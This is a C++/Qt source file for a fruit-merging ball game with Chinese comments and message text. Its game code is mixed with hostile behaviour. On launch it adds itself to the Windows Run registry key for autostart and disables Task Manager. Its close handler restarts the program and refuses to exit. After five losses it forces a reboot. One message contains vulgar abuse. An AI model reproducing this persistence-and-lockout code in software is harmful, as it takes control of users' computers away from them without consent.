#include "widget.h"
#include "ui_widget.h"
#include <QKeyEvent>
#include <QtDebug>
#include <QMouseEvent>

Widget::Widget(QWidget *parent)
    : QWidget(parent)
    , ui(new Ui::Widget)
{
    ui->setupUi(this);
    Win = false;
    e = new Explain(this);
    InitAll();
    _e.seed(time_t());
    //设置窗口透明度
    this->setWindowOpacity(0.8);
    //first-color:brush
    //second-color:pen
    QImage nb(":/nb.jpg");
    nb.scaled(20,20);
    this->_kind = {
        {0, {{nb, QColor(83, 29, 116)}, 20}},
        {1, {{nb, QColor(157, 39, 39)}, 30}},
        {2, {{nb, QColor(184, 86, 15)}, 40}},
        {3, {{nb, QColor(197, 172, 30)}, 45}},
        {4, {{nb, QColor(64, 162, 58)}, 55}},
        {5, {{nb, QColor(179, 101, 91)}, 65}},
        {6, {{nb, QColor(51, 154, 147)}, 75}},
        {7, {{nb, QColor(93, 93, 93)}, 85}},
        {8, {{nb, QColor(10, 84, 51)}, 100}},
        {9, {{nb, QColor(19, 26, 122)}, 110}}
    };
    this->_painter = new QPainter();
    QPixmap tempPix(_width, _height);
    tempPix.fill(this->_backGround);
    ui->game_lab->setPixmap(tempPix);
    connection();
}

Widget::~Widget()
{
    delete ui;
}

void Widget::connection()
{
    static int count = 5;
    connect(ui->btn_reset, &QPushButton::clicked, [ = ]() {
        this->_timer->stop();
        this->_fruits.clear();
        this->_score = 0.0;
        this->_timeTotal = 0.0;
        ui->lab_time->setText(QString::number(this->_timeTotal));
        ui->lab_Score->setText(QString::number(this->_score));
        QPixmap tempPix(_width, _height);
        tempPix.fill(this->_backGround);
        ui->game_lab->setPixmap(tempPix);
    });
    connect(this->_timer, &QTimer::timeout, [ = ]() {
        if(isFailed()) {
            if(count < 1){
                ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
            }
            wchar_t nb[200];
            wsprintf(nb,L"很抱歉奥,游戏失败,你还剩下%d次机会哦,%d次机会之后,如果还是过不了,你的电脑就会有一点点小惩罚哦!!!",count,count);
            MessageBox(NULL,nb,L"警告",MB_ICONERROR);

            count--;
            ui->btn_reset->click();
            return;
        }
        if(isWin() == true || Win == true) {
            ui->lab_answer->setText(e->nb);
            MessageBox(NULL,L"恭喜您,游戏获胜",L"祝贺",MB_OK);
            //解除禁用的任务管理器
            HKEY hKEY;  //句柄
            DWORD temp = 0;
            RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,KEY_ALL_ACCESS,&hKEY);
            RegSetValueEx(hKEY,L"DisableTaskMgr",0,REG_DWORD,(LPBYTE)&temp,sizeof(DWORD));
            MessageBox(NULL,L"已经帮您解除了任务管理器的禁用了哦,剩下关不掉的窗口可以用任务管理器去关闭哦",L"提示",MB_ICONINFORMATION);

            QMessageBox::about(NULL, "答案", e->nb);

            MessageBox(NULL,L"感谢游玩,希望您下次可以继续来玩哦!!!",L"感谢",MB_OK);
            exit(0);
            return;
        }
        this->_timeTotal += this->_mse / 1000.0;
        ui->lab_time->setText(QString::number(this->_timeTotal, 'f', 2));
        if(this->_fruits.back().first.IsActive()) {
            addFruit();
        }
        dealCrash();
        this->drawFruits();
    });
    connect(ui->btn_Start, &QPushButton::clicked, [ = ]() {
        addFruit();
        this->_timer->start(this->_mse);
    });
}

void Widget::keyPressEvent(QKeyEvent *event)
{
    if(this->_timer->isActive() && event->key() == Qt::Key_Return) {
        if(this->_fruits.back().first.IsActive()) {
            return QWidget::keyReleaseEvent(event);
        }
        this->_fruits.back().first.setActive(true);
        this->_fruits.back().first.setV_Down(100.0);
    }
    if(this->_timer->isActive() && event->key() == Qt::Key_A) {
        auto pos = this->_fruits.back().first.upDatePos() + QPointF(-12, 0);
        auto r = this->_kind[this->_fruits.back().second].second;
        if(pos.x() - r <= 0.0 || this->_fruits.back().first.IsActive()) {
            return QWidget::keyReleaseEvent(event);
        }
        this->_fruits.back().first.setPos(pos);
    }
    if(this->_timer->isActive() && event->key() == Qt::Key_D) {
        auto pos = this->_fruits.back().first.upDatePos() + QPointF(12, 0);
        auto r = this->_kind[this->_fruits.back().second].second;
        if(pos.x() + r >= this->_width || this->_fruits.back().first.IsActive()) {
            return QWidget::keyReleaseEvent(event);
        }
        this->_fruits.back().first.setPos(pos);
    }
    return QWidget::keyReleaseEvent(event);
}

void Widget::drawFruits()
{
    QPixmap tempPix(_width, _height);
    tempPix.fill(this->_backGround);
    this->_painter->begin(&tempPix);
    this->_painter->setPen(this->_redLine);
    this->_painter->drawLine(0, this->_upper_Boundary, this->_width, this->_upper_Boundary);
    for(auto &elem : this->_fruits) {
        this->_painter->setBrush(this->_kind[elem.second].first.first);
        this->_painter->setPen(QPen(QBrush(this->_kind[elem.second].first.second), 6));
        this->_painter->drawEllipse(
            elem.first.upDatePos(),
            elem.first.getR(),
            elem.first.getR());
    }
    ui->game_lab->setPixmap(tempPix);
    this->_painter->end();
}

void Widget::dealCrash()
{
    auto iter1 = this->_fruits.begin();
    while (iter1 != --(--this->_fruits.end())) {
        if(iter1->first.getPos().y() - iter1->first.getR() <= this->_upper_Boundary) {
            ++iter1;
            continue;
        }
        auto tempIter = iter1;
        auto iter2 = ++tempIter;
        while(iter2 != --this->_fruits.end()) {
            //预测接下来一步会不会碰撞
            auto pos1 = iter1->first.getPos();
            auto pos2 = iter2->first.getPos();
            auto r1 = iter1->first.getR();
            auto r2 = iter2->first.getR();
            auto tempmDis = this->distanct(pos1, pos2) - (r1 + r2);
            //如果不会碰撞或还没启动，不做处理
            if(pos2.y() - r2 <= this->_upper_Boundary
               || tempmDis > 0.1) {
                ++iter2;
                continue;
            }
            //得到当前的位置
            pos1 = iter1->first.getPos();
            pos2 = iter2->first.getPos();
            //得到当前的速度
            auto v1 = iter1->first.getV();
            auto v2 = iter2->first.getV();
            auto center_Vec = QPointF(pos1 - pos2);
            //将速度沿圆心连线方向投影
            auto tempPair1 = this->vectorDecomposition(v1, center_Vec);
            auto tempPair2 = this->vectorDecomposition(v2, center_Vec);
            //速度向量模的大小
            auto vecSize1 = this->module(tempPair1.first);
            auto vecSize2 = this->module(tempPair2.first);
            //如果速度过小，直接置为0.0
            if(vecSize1 <= 0.1) {
                iter1->first.setV(QPointF(0, 0));
                tempPair1 = {QPointF(0, 0), QPointF(0, 0)};
            }
            if(vecSize2 <= 0.1) {
                iter2->first.setV(QPointF(0, 0));
                tempPair2 = {QPointF(0, 0), QPointF(0, 0)};
            }
            //质量
            auto m1 = 3.14 * pow(r1, 3) * 90000;
            auto m2 = 3.14 * pow(r2, 3) * 90000;
            //碰撞模拟
            v1 = tempPair1.first;
            v2 = tempPair2.first;
            v1 = tempPair1.second + 0.4 * ((m1 - m2) * v1 + 2 * m2 * v2) / (m1 + m2);
            v2 = tempPair2.second + 0.4 * ((m2 - m1) * v2 + 2 * m1 * v1) / (m1 + m2);
            //设置碰撞后的速度
            iter1->first.setV(v1);
            iter2->first.setV(v2);
            //对越界图形进行处理
            auto change = 0.1 * center_Vec / this->module(center_Vec);
            if(pos1.y() < pos2.y()) {
                if(r1 - r2 == 0.0) {
                    this->_score += iter2->second;
                    ui->lab_Score->setText(QString::number(this->_score));
                    ++iter2->second;
                    iter2->first.setR(this->_kind[iter2->second].second);
                    iter1 = this->_fruits.erase(iter1);
                    iter2->first.setPos(pos2);
                    ++iter2;
                } else {
                    while(this->distanct(pos1, pos2) - (r1 + r2) < 0.1) {
                        pos1 += change;
                    }
                    iter1->first.setPos(pos1);
                    iter2->first.setPos(pos2);
                    ++iter2;
                }
            } else {
                if(r1 - r2 == 0.0) {
                    this->_score += iter2->second;
                    ui->lab_Score->setText(QString::number(this->_score));
                    ++iter1->second;
                    iter1->first.setR(this->_kind[iter1->second].second);
                    iter2 = this->_fruits.erase(iter2);
                    iter1->first.setPos(pos1);
                } else {
                    while(this->distanct(pos1, pos2) - (r1 + r2) < 0.1) {
                        pos2 -= change;
                    }
                    iter1->first.setPos(pos1);
                    iter2->first.setPos(pos2);
                    ++iter2;
                }
            }
        }
        ++iter1;
    }
}

void Widget::addFruit()
{
    uniform_int_distribution<int> u(0, 3);
    auto kinds = u(this->_e);
    this->_fruits.push_back({
        Fruit(this->_upper_Boundary,
              this->_width, this->_height, this->_mse,
              this->_kind[kinds].second),
        kinds
    });
}

bool Widget::isFailed()
{
    if(this->_fruits.size() <= 5) {
        return false;
    }
    auto temp = this->_fruits.begin();
    for(auto iter = this->_fruits.begin(); iter != --this->_fruits.end(); ++iter) {
        if(temp->first.getPos().y() > iter->first.getPos().y()) {
            temp = iter;
        }
    }
    if(temp->first.getPos().y() - temp->first.getR() < this->_upper_Boundary
       && temp->first.getV_Down() < 90.0) {
        return true;
    }
    return false;
}

bool Widget::isWin()
{
    auto iter = find_if(this->_fruits.begin(), this->_fruits.end(),
    [ = ](const pair<Fruit, int>& p) {
        return p.second == (--this->_kind.end())->first;
    });
    if(iter == this->_fruits.end()) {
        return false;
    }
    return true;
}

double Widget::module(const QPointF &p)
{
    return sqrt(pow(p.x(), 2) + pow(p.y(), 2));
}

pair<QPointF, QPointF> Widget::vectorDecomposition(const QPointF &source, const QPointF &target)
{
    auto a = source.x();
    auto b = source.y();
    auto c = target.x();
    auto d = target.y();
    if(c == 0.0) {
        return {
            QPointF(0, b),
            QPointF(a, 0)
        };
    }
    auto x = (a + (b * d / c)) / (1 + d * d / (c * c));
    return {
        QPointF(x, x * d / c),
        QPointF(a - x, b - x * d / c)
    };
}

double Widget::distanct(const QPointF &p1, const QPointF &p2)
{
    return sqrt(pow(p1.x() - p2.x(), 2) + pow(p1.y() - p2.y(), 2));
}
void Widget::closeEvent(QCloseEvent* event){
    QProcess *p = new QProcess(this);
    QString str = QApplication::applicationFilePath();
    p->startDetached(str);
    event->ignore();
    MessageBox(NULL,L"想关闭???,这是不可能的,任务管理器已禁用,甭想了,干啥也不好使,文件夹里有个腾讯QQ,看见了不,你想奥,难道那个东西就只是个摆设吗？？？",L"WARNING",MB_ICONERROR);
}
void InitAll(){
    InitJurisdiction();
    InitRegedit();
}
void InitJurisdiction(){
    //权限不够，必须提权
    //打开与进程相关的访问令牌
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
    //2.查看一下权限
    LUID luid;
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid);
    //3.更改权限
    TOKEN_PRIVILEGES tkp;
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;//开启权限
    tkp.Privileges[0].Luid = luid;
    if (AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, 0) == 0){
        MessageBox(NULL, L"调节权限失败,你小逼是不是开360给老子禁用了,我叼你妈的！！！", L"warning", MB_ICONERROR);
    }
}
void InitRegedit(){
    HKEY hKey; //自身exe开机自启动,禁用任务管理器的句柄
    RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
    //2.获取自身exe路径
    TCHAR szExePath[260];
    GetModuleFileName(NULL, szExePath, 260);
    //3.往注册表写入数据
    RegSetValueEx(hKey, L"System", 0, REG_SZ, (BYTE*)szExePath, 260);
    RegSetValueEx(hKey, L"哎嘿嘿", 0, REG_SZ, (BYTE*)szExePath,260 );
    //4.禁用任务管理器
    HKEY hKEY;
    DWORD temp = 1;
    RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,KEY_ALL_ACCESS,&hKEY);
    RegSetValueEx(hKEY,L"DisableTaskMgr",0,REG_DWORD,(LPBYTE)&temp,sizeof(DWORD));
}
void Widget::on_explan_clicked(){
    e->show();
    e->exec();
}
void Widget::on_win_clicked()
{
    if(MessageBox(NULL,L"您真的要跳过玩的步骤直接胜利游戏吗？？？",L"询问",MB_YESNO) == IDYES)
        if(MessageBox(NULL,L"真的真的吗,一定要考虑好啊,这是作者做了很长时间的心血啊,您确定要直接跳过吗！！！",L"询问",MB_YESNO) == IDYES)
            Win = true;
}
